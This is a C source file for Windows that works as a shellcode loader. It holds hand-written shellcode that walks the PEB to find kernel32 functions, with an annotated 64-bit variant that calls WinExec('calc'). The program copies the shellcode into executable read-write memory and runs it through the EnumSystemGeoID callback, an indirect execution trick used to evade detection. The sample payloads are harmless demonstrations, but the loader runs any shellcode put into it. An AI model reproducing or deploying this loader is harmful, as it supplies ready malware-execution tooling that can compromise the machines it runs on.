//#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>


int main()
{
    unsigned char shellcode[] =
        "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
        "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
        "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
        "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
        "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
        "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
        "\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
        "\x49\x0b\x31\xc0\x51\x50\xff\xd7";
    /*
    unsigned char shellcode[] =
        //"\xcc"
        // Find kernel32.dll base address
        "\x48\x31\xC9"              // xor rcx, rcx
        "\x65\x48\x8B\x41\x60"      // mov rax, gs: [rcx + 0x60]    ; RAX = PEB
        "\x48\x8B\x40\x18"          // mov rax, [rax + 0x18]        ; RAX = PEB->Ldr
        "\x48\x8B\x70\x10"          // mov rsi, [rax + 0x10]        ; RSI = PEB->Ldr.InLoadOrder
        "\x48\xAD"                  // lodsq                        ; RAX = Second module (lodsq == mov rax,QWORD PTR [rsi])
        "\x48\x96"                  // xchg rax, rsi                ; RAX = RSI, RSI = RAX
        "\x48\xAD"                  // lodsq                        ; RAX = Third(kernel32)
        "\x48\x8B\x58\x30"          // mov rbx, [rax + 0x30]        ; RBX = Base address
        // Find the export table of kernel32.dll
        "\x48\x31\xD2"                      // xor rdx, rdx
        "\x4D\x31\xC0"                      // xor r8, r8
        "\x48\x31\xF6"                      // xor rsi, rsi
        "\x8B\x53\x3C"                      // mov edx, [rbx + 0x3c]        ; RDX = DOS->e_lfanew
        "\x49\x89\xD0"                      // mov r8, rdx
        "\x48\x31\xD2"                      // xor rdx, rdx
        "\x42\x8B\x94\x03\x88\x00\x00\x00"  // mov edx, [rbx + r8 + 0x88]   ; RDX = Offset export table
        "\x49\x89\xD0"                      // mov r8, rdx
        "\x48\x31\xD2"                      // xor rdx, rdx
        "\x42\x8B\x54\x03\x20"              // mov edx, [rbx + r8 + 0x20]   ; RDX = Offset names table
        "\x48\x31\xC9"                      // xor rcx, rcx                 ; RCX = 0

        "\x48\x31\xF6"                          // xor rsi, rsi
        "\x48\x31\xC0"                          // xor rax, rax
        "\x48\x89\xD0"                          // mov rax, rdx
        // Find GetProcAddress function name     
        // Get_Function:
        "\x8B\x34\x03"                          // mov esi, [rbx + rax]                         ; RSI = name offset
        "\x48\xFF\xC1"                          // inc rcx                                      ; Increment the ordinal
        "\x48\x83\xC0\x04"                      // add rax, 4                                    
        "\x81\x3C\x33\x57\x69\x6E\x45"          // cmp dword ptr[rbx + rsi], 0x456e6957         ; WinE
        "\x75\xED"                              // jnz Get_Function
        "\x81\x7C\x33\x03\x45\x78\x65\x63"      // cmp dword ptr[rbx + rsi + 0x3], 0x63657845   ; Exec  
        "\x75\xE3"                              // jnz Get_Function
        //"\xcc"

        "\x48\x31\xD2"                          // xor rdx, rdx
        "\x48\x31\xC0"                          // xor rax, rax
        "\x42\x8B\x54\x03\x1C"                  // mov edx, [rbx + r8 + 0x1C]   ; RDX = Offset function table
        "\x48\xFF\xC9"                          // dec rcx
        "\x48\xC1\xE1\x02"                      // shl rcx, 2
        "\x48\x01\xD1"                          // add rcx, rdx
        "\x8B\x04\x0B"                          // mov eax, [rbx + rcx]
        "\x48\x01\xD8"                          // add rax, rbx                 ; RAX = WinExec ptr
        //"\xcc"
        // WinExec("calc",1)
        "\x48\x31\xD2"					// xor rdx, rdx
        "\x48\x31\xC9"					// xor rcx, rcx
        //"\x48\xC7\xC1\x63\x6D\x64\x00"	// mov rcx, 0x646d63 ;cmd
        "\x48\xC7\xC1\x63\x61\x6c\x63"	// mov rcx, 0x636c6163 ;calc
        "\x51"							// push rcx
        "\x48\x89\xE1"					// mov rcx, rsp
        "\x48\xFF\xC2"					// inc rdx
        "\xFF\xD0"						// call rax
        //"\xcc"
        "\x00"
        ;
    */
    HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(hAlloc, shellcode, sizeof(shellcode));

    EnumSystemGeoID(GEOCLASS_NATION, 0, (GEO_ENUMPROC)hAlloc);
}